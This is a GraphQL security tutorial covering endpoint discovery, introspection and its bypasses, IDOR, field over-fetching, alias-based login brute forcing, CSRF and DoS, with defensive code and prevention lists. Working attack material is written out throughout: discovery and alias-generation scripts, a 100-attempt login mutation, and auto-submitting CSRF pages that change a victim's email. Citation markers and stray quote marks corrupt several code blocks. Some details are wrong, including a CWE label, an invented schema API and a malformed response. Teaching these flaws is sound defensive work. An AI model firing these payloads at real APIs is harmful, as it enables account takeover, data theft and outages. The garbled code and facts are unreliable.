# GraphQL API Vulnerabilities

**Category:** Service Layer API Design & Implementation Flaws  
**Severity Focus:** High to Critical (Data Breach, Account Takeover, Admin Access, CSRF)  
**CWE Mapping:** CWE-20 (Primary), CWE-287, CWE-200, CWE-693  
**OWASP API Top 10 2023:** API1:2023 (Broken Object Level Authorization), API8:2023 (Security Misconfiguration)

---

##  1. GraphQL Endpoint Discovery

### Module 01: Universal Query Endpoint Detection
* **CWE Mapping:** CWE-200 (Information Disclosure)
* **OWASP API Top 10 Reference:** API8:2023-Security Misconfiguration

#### Low-Level Architectural Mechanics
GraphQL APIs use a single endpoint for all requests. [source: 2] The universal query `query{__typename}` returns `{"data": {"__typename": "query"}}` from any GraphQL endpoint because `__typename` is a reserved field that returns the queried object's type. [source: 3] Every GraphQL endpoint has `__typename` as a built-in field. This creates a reliable boolean indicator:

* **Valid GraphQL endpoint** → returns `{"data": {"__typename": "query"}}` ✓
* **Non-GraphQL endpoint** → returns "query not present" or HTTP 404 ✗

The attacker exploits this by sending universal queries to common endpoint locations to discover GraphQL services.

#### 🎯 Raw Universal Query Request
```text
POST /graphql HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "query": "query{__typename}"
}
```
📄 Demo Server Response (GraphQL Endpoint Confirmed)
Plaintext

HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "__typename": "query"
  }
}

    Result: __typename returned confirms this is a GraphQL endpoint ✓

📄 Demo Server Response (Not GraphQL)
Plaintext

HTTP/1.1 404 Not Found
Content-Type: text/html

<!-- Not found or "query not present" -->

    Result: Error indicates NOT a GraphQL endpoint ✗

Attacker Endpoint Discovery Script
Python

import requests
import json

common_endpoints = [
    '/graphql',
    '/api',
    '/api/graphql',
    '/graphql/api',
    '/graphql/graphql',
    '[source: 5]  /graphql/v1',
    '/api/graphql/v1'
]

universal_query = {"query": "query{__typename}"}

for endpoint in common_endpoints:
    response = requests.post(
        f'[https://vulnerable-app.com](https://vulnerable-app.com){endpoint}',
        json=universal_query
    )
    
    if response.status_code == 200 and '__typename' in response.text:
        print(f"[+] GraphQL endpoint found: {endpoint} ✓")
        print(f"Response: {response.json()}")

Module 02: HTTP Method Testing (GET, POST, x-www-form-urlencoded)

    CWE Mapping: CWE-693 (Protection Mechanism Failure)

    OWASP API Top 10 Reference: API8:2023-Security [source: 6] Misconfiguration

Low-Level Architectural Mechanics

Best practice requires production GraphQL endpoints to accept ONLY POST requests with Content-Type: application/json. This prevents CSRF vulnerabilities. [source: 7] However, vulnerable endpoints may accept:

    GET requests (CSRF vulnerable)

    POST with x-www-form-urlencoded (CSRF vulnerable)

    POST with wrong content-type

The attacker exploits this by testing alternative methods when standard POST fails.
🎯 Raw GET Universal Query
Plaintext

GET /graphql?query=query%7B__typename%7D HTTP/1.1
Host: vulnerable-app.com

📄 Demo Server Response (GET Accepted)
Plaintext

HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "__typename": "query"
  }
}

    Result: GraphQL accepts GET → CSRF vulnerable ✓

🎯 Raw x-www-form-urlencoded POST
Plaintext

POST /graphql HTTP/1.1
Host: vulnerable-app.com
Content-Type: x-www-form-urlencoded

query=query%7B__typename%7D

📄 Demo Server Response (x-www-form-urlencoded Accepted)
Plaintext

HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "__typename": "query"
  }
}

    Result: GraphQL accepts form-urlencoded → CSRF vulnerable ✓

🔬 2. GraphQL Schema Discovery
Module 03: Introspection Probe (Schema Enumeration)

    CWE Mapping: CWE-200 (Information Disclosure)

    OWASP API Top 10 Reference: API8:2023-Security Misconfiguration

Low-Level [source: 9] Architectural Mechanics

Introspection is a built-in GraphQL feature that queries the __schema field to retrieve schema information. [source: 10] It discloses:

    All available queries, mutations, subscriptions

    Type definitions (fields, arguments)

    Description fields (may contain sensitive data)

    Input values and their types

Best practice: Introspection should be disabled in production to prevent attackers from learning the schema. [source: 11] However, many developers leave it enabled.

The attacker exploits introspection to:

    Map the entire API structure

    Discover hidden fields (e.g., password, isAdmin, email)

    Find mutations for unauthorized actions

🎯 Raw Introspection Probe
Plaintext

POST /graphql HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "query": "{__schema{queryType{name}}}"
}

📄 Demo Server Response (Introspection Enabled)
Plaintext

HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "queryType": {
      "name": "Query"
    }
  }
}

    Result: Introspection enabled, schema enumeration possible ✓

📄 Demo Server Response (Introspection Disabled)
Plaintext

HTTP/1.1 400 Bad Request
Content-Type: application/json

{
  "errors": [
    '[source: 12]  {
      "message": "Introspection is disabled"
    }
  ]
}

    Result: Introspection disabled, need alternative methods ✗

Module 04: Full Introspection Query (Complete Schema)

    CWE Mapping: CWE-200 (Information Disclosure)

    OWASP API Top 10 Reference: API8:2023-Security Misconfiguration

Low-Level Architectural Mechanics

After confirming introspection is enabled, run the full introspection query to retrieve complete schema details including queries, mutations, subscriptions, types, and fragments. [source: 13] The full query returns:

    queryType: All available queries

    mutationType: All available mutations

    types: All type definitions with fields, arguments, and descriptions

    directives: Available directives

Burp can generate introspection queries automatically via GraphQL tab.
🎯 Raw Full Introspection Query
GraphQL

POST /graphql HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "query": "query IntrospectionQuery {
    __schema {
      queryType { name }
      mutationType { name }
      subscriptionType { name }
      types {
        ...FullType
      }
      directives {
        name
        description
        args { ...InputValue '[source: 15] }
        onOperation
        onFragment
        onField
      }
    }
  }
  fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
      name
      description
      args { ...InputValue }
      type { ...TypeRef }
      isDeprecated
      '[source: 16]   deprecationReason
    }
    inputFields { ...InputValue }
    interfaces { ...TypeRef }
    enumValues(includeDeprecated: true) {
      name
      description
      isDeprecated
      deprecationReason
    }
    possibleTypes { ...TypeRef }
  }
  fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
  }
  fragment TypeRef on __Type {
    '[source: 17] kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
        }
      }
    }
  }"
}

📄 Demo Server Response (Full Schema)
JSON

HTTP/1.1 200 '[source: 18] OK
Content-Type: application/json

{
  "data": {
    "__schema": {
      "queryType": { "name": "Query" },
      "mutationType": { "name": "Mutation" },
      "types": [
        {
          "kind": "OBJECT",
          "name": "User",
          "fields": [
            {
              '[source: 19]    "name": "id",
              "type": { "name": "ID" }
            },
            {
              "name": "username",
              "type": { "name": "String" }
            },
            '[source: 20]    {
              "name": "email",
              "type": { "name": "String" },
              "description": "User's private email"
            },
            {
              "name": "password",
              '[source: 21]       "type": { "name": "String" },
              "description": "User's password hash"
            },
            {
              "name": "isAdmin",
              "type": { "name": "Boolean" }
            }
          '[source: 22]       ]
        }
      ]
    }
  }
}

    Result: Complete schema reveals sensitive fields (password, email, isAdmin) ✓

Backend Should Implement (Secure Implementation)
Python

# ✅ SECURE (Introspection Disabled in Production)
from graphql import make_schema

schema = make_schema(
    introspection_enabled=False  # ← Disable introspection in production
)

Module 05: Introspection Bypass (Special Characters)

    CWE Mapping: CWE-20 (Improper Input Validation)

    OWASP API Top 10 Reference: API8:2023-Security Misconfiguration

Low-Level Architectural Mechanics

When developers disable introspection, they may use regex to [source: 23] exclude __schema{ from queries. However, GraphQL ignores special characters (spaces, newlines, commas) that regex doesn't account for. [source: 24] The attacker bypasses regex-based filtering by inserting:

    Space: __schema { (instead of __schema{)

    Newline: __schema\n{

    Comma: __schema, {

Example: If regex excludes __schema{, then __schema { passes because regex doesn't match the space.
🎯 Raw Introspection Bypass (Newline)
Plaintext

POST /graphql HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "query": "query{__schema {\nqueryType{name}}}"
}

📄 Demo Server Response (Bypass Successful)
JSON

HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "queryType": {
      "name": "Query"
    }
  }
}

    Result: Newline bypassed regex filter, introspection enabled ✓

Module 06: Suggestions Abuse (Schema Recovery Without Introspection)

    CWE Mapping: CWE-200 (Information Disclosure)

    OWASP API Top 10 Reference: API8:2023-Security Misconfiguration

Low-Level Architectural Mechanics

Apollo GraphQL platform offers "suggestions" - when a query is slightly incorrect, the server suggests the correct field name. [source: 26] Example: "There is no entry for 'productInfo'. Did you mean 'productInformation' instead?" [source: 27] This feature leaks schema information even when introspection is disabled. [source: 28] The attacker exploits this by:

    Querying with intentionally wrong field names

    Collecting suggestions to map the schema

    Using Clairvoyance tool to automate schema recovery

Apollo Server v4+: Disable with hideSchemaDetailsFromClientErrors option.
🎯 Raw Suggestions Abuse
Plaintext

POST /graphql HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "query": "{ productInfo { id name } }"
}

📄 Demo Server Response (Suggestion Provided)
JSON

HTTP/1.1 400 Bad Request
Content-Type: application/json

{
  "errors": [
    {
      "message": "Cannot query field 'productInfo' on type 'Query'. Did you mean 'productInformation'?"
    '[source: 30] }
  ]
}

    Result: Server suggested correct field name, schema discovered ✓

Clairvoyance Automated Schema Recovery
Bash

# Install Clairvoyance
npm install clairvoyance

# Automated schema recovery
clairvoyance [https://vulnerable-app.com/graphql](https://vulnerable-app.com/graphql)

# Output: Complete schema recovered without introspection

🔬 3. GraphQL Access Control Vulnerabilities
Module 07: IDOR via GraphQL Arguments (Insecure Direct Object Reference)

    CWE Mapping: CWE-287 (Improper Authentication)

    OWASP API Top 10 Reference: API1:2023-Broken Object Level Authorization

Low-Level Architectural Mechanics

GraphQL uses arguments to access objects directly. [source: 31] If the API doesn't validate object ownership, a user can access information they shouldn't by supplying an argument for that information. [source: 32] Example:

    Query: products returns only listed products

    Response: [{"id": 1}, {"id": 2}, {"id": 4}] (product 3 missing → delisted)

    Attack: Query product(id: 3) → returns delisted product details

The attacker exploits this by:

    Identifying sequential IDs in responses

    Querying missing IDs directly

    Accessing unauthorized data

🎯 Raw IDOR Attack
GraphQL

POST /graphql HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "query": "{ product(id: 3) { id name listed } }"
}

📄 Demo Server Response (Unauthorized Access)
JSON

HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "product": {
      '[source: 33]  "id": 3,
      "name": "Product 3",
      "listed": false
    }
  }
}

    Result: Accessed delisted product without authorization, IDOR confirmed ✓

Backend Should Implement (Secure Implementation)
Python

# ✅ SECURE (Validate Ownership)
def product_query(user, id):
    product = db.get_product(id)
    
    if not product:
        return None
    
    # Check if user owns this product
    if product.owner_id != user.id and not user.is_admin:
        '[source: 34]   raise AuthorizationError("Access denied")
    
    return product

Module 08: Accidental Field Exposure (Over-Fetching)

    CWE Mapping: CWE-200 (Information Disclosure)

    OWASP API Top 10 Reference: API8:2023-Security Misconfiguration

Low-Level Architectural Mechanics

GraphQL schemas may expose private user fields (password, email, userID) that shouldn't be accessible to regular users. [source: 35] The API returns all requested fields without filtering based on user permissions. [source: 36] The attacker exploits this by:

    Running introspection to find sensitive fields

    Querying those fields directly

    Accessing data they shouldn't see

Example: getUser(id: 1) returns id, username, password, email instead of just id, username.
🎯 Raw Field Exposure Attack
GraphQL

POST /graphql HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "query": "{ getUser(id: 1) { id username email password isAdmin } }"
}

📄 Demo Server Response (Sensitive Data Exposed)
JSON

HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "getUser": {
      "id": 1,
      "username": "admin",
      "email": "admin@example.com",
      "password": "5f4dcc3b5aa765d61d8327deb882cf99",
      "isAdmin": true
    }
  }
}

    Result: Password, email, and isAdmin exposed to unauthorized user ✓

Backend Should Implement (Secure Implementation)
Python

# ✅ SECURE (Filter '[source: 38] Fields by Permission)
def get_user_query(user, id):
    target_user = db.get_user(id)
    
    if not target_user or target_user.id != user.id and not user.is_admin:
        raise AuthorizationError("Access denied")
    
    # Return only allowed fields
    return {
        "id": target_user.id,
        "username": target_user.username
        # ❌ NO password, email, isAdmin
    }

🔬 4. GraphQL Rate Limiting & Brute Force
Module 09: Alias-Based Brute Force Bypass

    CWE Mapping: CWE-307 (Improper Error Handling)

    OWASP API Top 10 Reference: API8:2023-Security Misconfiguration

Low-Level Architectural Mechanics

GraphQL aliases allow multiple properties with the same name in one request. [source: 40] This enables sending multiple queries in a single HTTP message, bypassing rate limiters that count HTTP requests rather than operations. [source: 41] Example:
GraphQL

isValidDiscount(code: 123456) { valid }
isValidDiscount2:isValidDiscount(code: 123456) { valid }
isValidDiscount3:isValidDiscount(code: 123456) { valid }

This is 1 HTTP request but 3 operations → bypasses rate limiting. [source: 42] The attacker exploits aliases to:

    Send 100+ login attempts in 1 request

    Brute force discount codes

    Bypass rate limiting

🎯 Raw Alias-Based Brute Force
GraphQL

POST /graphql HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "query": "mutation {
    brute0:login(input:{password: \"123456\", username: \"carlos\"}) { token success }
    brute1:login(input:{password: \"password\", username: \"carlos\"}) { token success }
    brute2:login(input:{password: \"qwerty\", username: \"carlos\"}) { token success }
    ...
    brute99:login(input:{password: \"12345678\", username: \"carlos\"}) { token success }
  }"
}

📄 Demo Server Response (100 Attempts in 1 Request)
JSON

HTTP/1.1 200 OK
Content-Type: '[source: 43] application/json

{
  "data": {
    "brute0": { "token": null, "success": false },
    "brute1": { "token": null, "success": false },
    "brute2": { "token": null, "success": false },
    "brute47": { "token": "abc123", "success": true },  # ← Found!
    '...
  }
}

    Result: 100 login attempts in 1 request, bypassed rate limiting ✓

Alias Generation Script
JavaScript

// Run in browser console to generate aliases
const passwords = ['123456', 'password', 'qwerty', ...];
[source: 45] const aliases = passwords.map((password, index) => 
  `brute${index}:login(input:{password: "${password}", username: "carlos"}) { token success }`
).join('\n');

console.log(`mutation { ${aliases} }`);

🔬 5. GraphQL CSRF Vulnerabilities
Module 10: CSRF via GET Requests

    CWE Mapping: CWE-693 (Protection Mechanism Failure)

    OWASP API Top 10 Reference: API8:2023-Security Misconfiguration

Low-Level Architectural Mechanics

Cross-Site Request Forgery (CSRF) enables attackers to induce users to perform unintended actions. [source: 47] GraphQL CSRF arises when:

    Endpoint accepts GET requests (can be sent by browser)

    Endpoint accepts x-www-form-urlencoded POST (can be sent by browser)

    No CSRF tokens implemented

application/json POST is secure against CSRF because browsers can't set custom content types. [source: 48] But GET and x-www-form-urlencoded can be forged.

The attacker exploits this by:

    Creating HTML exploit page

    Forging GraphQL mutation via GET/form

    Victim visits page → mutation executes with their session

🎯 Raw CSRF Attack (GET Request)
XML

<!-- Exploit HTML -->
<!DOCTYPE html>
<html>
<body>
  <script>
    // Forge GraphQL mutation via GET
    const url = '[https://vulnerable-app.com/graphql?query=mutation%20%7B%20changeEmail%28input%3A%7Bemail%3A%20%22hacker%40hacker.com%22%7D%29%20%7B%20email%20%7D%20%7D](https://vulnerable-app.com/graphql?query=mutation%20%7B%20changeEmail%28input%3A%7Bemail%3A%20%22hacker%40hacker.com%22%7D%29%20%7B%20email%20%7D%20%7D)';
    '[source: 49] fetch(url, { method: 'GET' });
  </script>
</body>
</html>

📄 Demo Server Response (CSRF Successful)
JSON

HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "changeEmail": {
      "email": "hacker@hacker.com"
    }
  }
}

    Result: Victim's email changed via forged GET request, CSRF confirmed ✓

Module 11: CSRF via x-www-form-urlencoded POST

    CWE Mapping: CWE-693 (Protection Mechanism Failure)

    OWASP API Top 10 Reference: API8:2023-Security Misconfiguration

Low-Level Architectural Mechanics

When GraphQL accepts POST with x-www-form-urlencoded, browsers can send this request type, making it CSRF vulnerable. [source: 50] The attacker crafts an HTML form that submits the mutation. [source: 51] The steps:

    Convert GraphQL mutation to URL-encoded form

    Create HTML form with auto-submit

    Victim loads page → form submits mutation with their session

🎯 Raw CSRF Attack (x-www-form-urlencoded)
XML

<!-- Exploit HTML -->
<!DOCTYPE html>
<html>
<body>
  <form id="csrf-form" action="[https://vulnerable-app.com/graphql](https://vulnerable-app.com/graphql)" method="POST">
    <input type="hidden" name="query" value="changeEmail mutation" />
    <input type="hidden" name="operationName" value="changeEmail" />
    <input type="hidden" name="variables" value="{\"input\":{\"email\":\"hacker@hacker.com\"}}" />
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  '</script>
</body>
</html>

URL-Encoded Body
Plaintext

query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A
&operationName=changeEmail
&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D

📄 Demo Server Response (CSRF Successful)
JSON

HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "changeEmail": {
      "email": "hacker@hacker.com"
    }
  }
}

    Result: Email changed via forged form, CSRF confirmed ✓

Burp CSRF PoC Generator
Python

# Right-click request → Engagement tools → Generate CSRF PoC
# Burp generates HTML exploit automatically

🔬 6. GraphQL Denial of Service
Module 12: Query Depth DoS (Nested Queries)

    CWE Mapping: CWE-400 (Uncontrolled Resource Consumption)

    OWASP API Top 10 Reference: API8:2023-Security Misconfiguration

Low-Level Architectural Mechanics

GraphQL allows deeply nested queries that can have significant [source: 53] performance implications. Heavily-nested queries can cause:

    Database performance degradation

    CPU exhaustion

    Memory overflow

    Denial of Service (DoS)

Example:
GraphQL

{
  user {
    friends {
      friends {
        friends {
          ...
        }
      }
    }
  }
}

The attacker exploits this by sending deeply nested queries to exhaust server resources.
🎯 Raw DoS Query (Deep Nesting)
GraphQL

POST /graphql HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "query": "{
    user {
      friends {
        friends {
          friends {
            friends {
              friends {
                ...
              ' }
            }
          }
        }
      }
    }
  }"
}

Backend Should Implement (Secure Implementation)
Python

# ✅ SECURE (Query Depth Limit)
class QueryDepthLimit:
    MAX_DEPTH = 10
    
    def validate(self, query):
        depth = self.calculate_depth(query)
        if depth > self.MAX_DEPTH:
            raise QueryError("Query depth exceeds limit")
        return True

Module 13: Operation Limits DoS (Aliases, Fields)

    CWE Mapping: CWE-400 (Uncontrolled Resource Consumption)

    OWASP API Top 10 Reference: API8:2023-Security Misconfiguration

Low-Level Architectural Mechanics

GraphQL APIs should configure operation limits to prevent:

    Too many unique fields

    Too many aliases

    Too many root fields

    Queries exceeding byte size

Example with 100 aliases:
GraphQL

{
  field1: user { id }
  field2: user { id }
  field3: user { id }
  '...
  field100: user { id }
}

This is 100 operations in 1 request → resource exhaustion. [source: 58]
Backend Should Implement (Secure Implementation)
Python

# ✅ SECURE (Operation Limits)
class OperationLimits:
    MAX_FIELDS = 50
    MAX_ALIASES = 20
    MAX_ROOT_FIELDS = 10
    MAX_BYTES = 10000
    
    def validate(self, query):
        if query.num_fields > self.MAX_FIELDS:
            raise QueryError("Too many fields")
        if query.num_aliases > self.MAX_ALIASES:
            raise QueryError("Too many aliases")
        if len(query) > self.MAX_BYTES:
            raise QueryError("Query too large")
        return True

Module 14: Cost Analysis DoS Prevention

    CWE Mapping: CWE-400 (Uncontrolled Resource Consumption)

    OWASP API Top 10 Reference: API8:2023-Security Misconfiguration

Low-Level Architectural Mechanics

Cost analysis identifies the resource cost of queries as they're received. [source: 60] If a query would be too computationally complex, the API drops it. [source: 61]

Implementation:

    Assign cost to each field (e.g., user = 1, user.friends = 10)

    Calculate total query cost

    Reject if cost > threshold

Backend Should Implement (Secure Implementation)
Python

# ✅ SECURE (Cost Analysis)
class CostAnalyzer:
    FIELD_COSTS = {
        'user': 1,
        'user.friends': 10,
        'user.posts': 5,
        'posts': 2
    }
    MAX_COST = 100
    
    def analyze(self, query):
        total_cost = 0
        for field in query.fields:
            total_cost += self.FIELD_COSTS.get(field, 1)
        
        if total_cost > self.MAX_COST:
            raise QueryError("Query cost exceeds limit")
        return total_cost## Detection & Exploitation Methodology

### Step 1: GraphQL Endpoint Discovery

**Techniques**

- **Universal Query:** Send `query { __typename }` to common endpoints to identify GraphQL services.
- **Common Endpoint Paths:** Test locations such as `/graphql`, `/api`, `/api/graphql`, and `/graphql/v1`.
- **HTTP Method Testing:** Verify whether the endpoint accepts `GET`, `POST`, or `application/x-www-form-urlencoded` requests.

**Tools**

- Burp Scanner (automatic GraphQL endpoint detection)
- Python scripts

---

### Step 2: Schema Discovery

**Techniques**

- **Introspection Probe:** Execute `__schema` queries to determine whether introspection is enabled.
- **Full Introspection:** Retrieve the complete GraphQL schema, including types, queries, mutations, and subscriptions.
- **Introspection Bypass:** Attempt to bypass introspection restrictions using whitespace, newlines, or commas after `__schema`.
- **Suggestions Abuse:** Submit invalid field names and analyze server suggestions to infer schema details.
- **Clairvoyance:** Automatically recover the schema when introspection is disabled.

**Tools**

- Burp GraphQL Tab
- Clairvoyance

---

### Step 3: Access Control Testing

**Techniques**

- **Argument IDOR:** Query objects directly using sequential or predictable identifiers.
- **Field Over-Fetching:** Request sensitive fields such as `password`, `email`, or `isAdmin` to identify excessive data exposure.
- **Ownership Validation:** Verify whether the API enforces authorization checks before returning object data.

**Tools**

- Burp Repeater

---

### Step 4: Rate Limiting Testing

**Techniques**

- **Alias-Based Brute Force:** Send multiple operations in a single request using GraphQL aliases.
- **Query Depth Testing:** Submit deeply nested queries to evaluate depth restrictions.
- **Operation Limits Testing:** Test the maximum number of fields, aliases, and root operations allowed in a request.

**Tools**

- Burp Repeater
- JavaScript Alias Generator

---

### Step 5: CSRF Testing

**Techniques**

- **GET Request Testing:** Determine whether the GraphQL endpoint accepts state-changing requests over HTTP GET.
- **`application/x-www-form-urlencoded` Testing:** Verify whether form-encoded POST requests are accepted.
- **CSRF Proof-of-Concept (PoC):** Generate an HTML-based CSRF exploit to validate whether mutations can be executed from another origin.

**Tools**

- Burp CSRF PoC Generator

---

## Prevention Strategies

### Secure GraphQL Introspection

To minimize information disclosure through GraphQL schema enumeration, implement the following security measures:

- **Disable Introspection in Production:** Disable GraphQL introspection in production environments unless the API is intended for public use.
- **Review the Schema:** Regularly audit the GraphQL schema to identify and remove unintended or sensitive fields.
- **Disable Schema Suggestions:** Disable field and type suggestions (e.g., `hideSchemaDetailsFromClientErrors`) to prevent attackers from recovering the schema through error messages.
- **Avoid Regex-Based Filtering:** Do not rely on regular expression filtering to block introspection, as attackers can bypass such filters using whitespace, newlines, or other special characters.

---

### Secure GraphQL Access Control

To prevent unauthorized access to GraphQL resources, enforce robust authorization at every layer:

- **Validate Object Ownership:** Verify that users are authorized to access or modify every object referenced in queries and mutations.
- **Restrict Field Exposure:** Return only the fields that the authenticated user is permitted to access, avoiding exposure of sensitive data such as passwords or email addresses.
- **Use Authorization Directives:** Apply authorization directives or middleware at the field and resolver level to enforce consistent access control.
- **Implement Role-Based Access Control (RBAC):** Assign permissions based on user roles (e.g., administrator, authenticated user, guest) to restrict access to privileged operations.

## Secure GraphQL Rate Limiting

To protect GraphQL APIs from brute-force attacks and resource abuse, implement the following rate-limiting controls:

- **Count Operations:** Apply rate limits based on the number of GraphQL operations rather than the number of HTTP requests.
- **Limit Query Depth:** Restrict the maximum nesting depth of GraphQL queries (e.g., **10 levels**) to prevent complex recursive requests.
- **Configure Operation Limits:** Limit the number of fields, aliases, root fields, and fragments allowed in a single query (e.g., **50 fields**, **20 aliases**).
- **Limit Query Size:** Enforce a maximum query size (e.g., **10 KB**) to prevent oversized requests.
- **Implement Cost Analysis:** Assign execution costs to GraphQL fields and reject queries that exceed a predefined complexity threshold.

---

## Secure GraphQL CSRF Prevention

To protect GraphQL APIs from Cross-Site Request Forgery (CSRF) attacks, implement the following security measures:

- **Accept Only JSON-Encoded POST Requests:** Configure the GraphQL endpoint to accept only `application/json` POST requests, preventing browsers from forging requests using standard HTML forms.
- **Validate Content-Type:** Verify that the `Content-Type` header matches the request body before processing the request.
- **Implement CSRF Tokens:** Use synchronizer or double-submit CSRF tokens to validate state-changing requests.
- **Use SameSite Cookies:** Configure authentication cookies with `SameSite=Strict` or `SameSite=Lax` to reduce the risk of cross-site request forgery.
    
## Secure GraphQL DoS Prevention

To protect GraphQL APIs from Denial-of-Service (DoS) attacks, implement the following security controls:

- **Query Depth Limits:** Restrict the maximum nesting depth of GraphQL queries to prevent resource exhaustion caused by deeply nested queries.
- **Operation Limits:** Limit the number of fields, aliases, root fields, and fragments allowed in a single request to reduce query complexity.
- **Byte Size Limits:** Enforce a maximum query size to block oversized requests that could consume excessive server resources.
- **Cost Analysis:** Calculate the execution cost of each query and reject requests that exceed a predefined complexity threshold.
- **Query Timeouts:** Configure maximum execution times to terminate long-running queries and prevent CPU or database resource exhaustion.
  

# 🎯 Key Takeaways

## When to Hunt for GraphQL Vulnerabilities

Look for the following indicators during a GraphQL security assessment:

-  The universal query `query { __typename }` returns a valid response.
-  The endpoint accepts **GET** requests or **`application/x-www-form-urlencoded`** requests.
-  **Introspection** is enabled and returns schema information.
-  Error messages provide **field name suggestions**, allowing schema discovery.
-  Object identifiers (IDs) are **sequential**, indicating potential IDOR opportunities.
-  Objects missing from list queries can still be queried directly by ID.
-  The schema exposes **sensitive fields** such as:
  - `password`
  - `email`
  - `isAdmin`
  - Internal identifiers
-  Authentication or sensitive mutations have **no effective rate limiting**, making brute-force attacks possible.

## Common Attack Opportunities

| Indicator | Potential Vulnerability |
|-----------|-------------------------|
| `__typename` query succeeds | GraphQL endpoint discovered |
| GET requests accepted | CSRF risk |
| `application/x-www-form-urlencoded` accepted | CSRF risk |
| Introspection enabled | Complete schema enumeration |
| Field suggestions enabled | Schema recovery without introspection |
| Sequential IDs | Broken Object Level Authorization (IDOR) |
| Hidden objects accessible by ID | Authorization bypass |
| Sensitive fields exposed | Information disclosure |
| No mutation rate limiting | Brute-force and credential stuffing |
| No query depth or cost limits | Denial-of-Service (DoS) |
